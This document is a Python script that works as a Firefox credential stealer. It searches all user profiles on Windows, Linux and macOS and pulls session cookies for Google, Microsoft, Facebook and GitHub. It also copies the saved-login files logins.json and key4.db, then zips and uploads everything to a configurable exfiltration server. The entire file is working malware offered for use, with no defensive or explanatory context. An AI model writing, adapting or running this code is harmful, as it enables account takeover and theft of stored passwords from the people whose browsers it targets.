import os
import sqlite3
import json
import shutil
import platform
import tempfile
import requests
from zipfile import ZipFile

# Configuration
TARGET_DOMAINS = ['google.com', 'microsoft.com', 'facebook.com', 'github.com']
EXFIL_URL = 'http://127.0.0.1:5000'  # Replace with your server

def find_firefox_profiles():
    profiles = []
    system = platform.system()
    
    try:
        if system == 'Windows':
            users_dir = os.path.join('C:\\', 'Users')
            for user in os.listdir(users_dir):
                profile_path = os.path.join(users_dir, user, 'AppData', 'Roaming',
                                          'Mozilla', 'Firefox', 'Profiles')
                if os.path.exists(profile_path):
                    profiles.extend(os.path.join(profile_path, p) 
                                     for p in os.listdir(profile_path) 
                                     if p.endswith(('.default-release', '.default')))
        
        elif system == 'Linux' or system == 'Darwin':
            home_dir = '/home' if system == 'Linux' else '/Users'
            for user in os.listdir(home_dir):
                profile_path = os.path.join(home_dir, user, '.mozilla', 'firefox')
                if os.path.exists(profile_path):
                    profiles.extend(os.path.join(profile_path, p) 
                                     for p in os.listdir(profile_path) 
                                     if p.endswith(('.default-release', '.default')))
        
        return profiles
    
    except Exception as e:
        print(f"Error finding profiles: {e}")
        return []

def extract_cookies(profile_path):
    try:
        conn = sqlite3.connect(os.path.join(profile_path, 'cookies.sqlite'))
        cursor = conn.cursor()
        
        # Query cookies for target domains
        domain_clause = " OR ".join([f"host LIKE '%{d}%'" for d in TARGET_DOMAINS])
        cursor.execute(f"""
            SELECT name, value, host, path, expiry, isSecure 
            FROM moz_cookies 
            WHERE {domain_clause}
        """)
        
        cookies = []
        for row in cursor.fetchall():
            cookies.append({
                'name': row[0],
                'value': row[1],
                'domain': row[2],
                'path': row[3],
                'expiry': row[4],
                'secure': bool(row[5])
            })
        
        conn.close()
        return cookies
    
    except Exception as e:
        print(f"Error extracting cookies: {e}")
        return []

def copy_cookie_files(profile_path, temp_dir):
    try:
        files_to_copy = ['cookies.sqlite', 'key4.db', 'logins.json']
        copied_files = []
        
        for fname in files_to_copy:
            src = os.path.join(profile_path, fname)
            if os.path.exists(src):
                dst = os.path.join(temp_dir, fname)
                shutil.copy2(src, dst)
                copied_files.append(dst)
        
        return copied_files
    
    except Exception as e:
        print(f"Error copying files: {e}")
        return []

def exfiltrate_data(data, files):
    try:
        # New: Save cookies locally
        with open('cookies.json', 'w') as local_file:
            json.dump(data, local_file, indent=4)
            print("[+] Saved cookies to local cookies.json file")

        # Original exfiltration code
        # Send structured cookie data
        requests.post(EXFIL_URL, json={'cookies': data}, timeout=5)
        
        # Send cookie files as zip
        with tempfile.NamedTemporaryFile(delete=False) as tmp_zip:
            with ZipFile(tmp_zip.name, 'w') as zipf:
                for f in files:
                    zipf.write(f, os.path.basename(f))
            
            with open(tmp_zip.name, 'rb') as f:
                requests.post(EXFIL_URL, files={'archive': f}, timeout=10)
        
        return True
    
    except Exception as e:
        print(f"Exfiltration failed: {e}")
        return False

def main():
    # Create temporary working directory
    with tempfile.TemporaryDirectory() as temp_dir:
        all_cookies = []
        all_files = []
        
        # Process all found profiles
        for profile in find_firefox_profiles():
            # Extract cookies
            cookies = extract_cookies(profile)
            all_cookies.extend(cookies)
            
            # Copy cookie files
            copied = copy_cookie_files(profile, temp_dir)
            all_files.extend(copied)
        
        # Exfiltrate data
        if all_cookies or all_files:
            exfiltrate_data(all_cookies, all_files)
            
        print(f"Exfiltrated {len(all_cookies)} cookies and {len(all_files)} files")

if __name__ == '__main__':
    main()